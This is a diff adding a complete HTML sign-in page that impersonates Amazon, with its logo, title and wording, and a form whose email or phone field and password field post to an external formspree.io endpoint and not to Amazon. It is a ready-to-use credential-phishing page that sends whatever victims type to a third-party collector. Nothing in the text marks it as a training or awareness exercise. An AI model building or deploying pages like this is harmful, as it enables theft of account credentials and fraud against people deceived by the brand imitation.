@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Login</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <!-- Amazon Logo -->
+            <img src="amazon-logo.png" alt="Amazon" class="logo">
+            <h1>Sign-In</h1>
+            <form action="https://formspree.io/f/meoapywz" method="POST" id="loginForm">
+                <label for="email">Email or mobile phone number</label>
+                <input type="text" id="email" name="email" required>
+
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+
+                <button type="submit" class="continue-btn">Continue</button>
+
+                <p>By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
+            </form>
+
+            <div class="new-account">
+                <h2>New to Amazon?</h2>
+                <button class="create-account-btn">Create your Amazon account</button>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
+
+    
+    
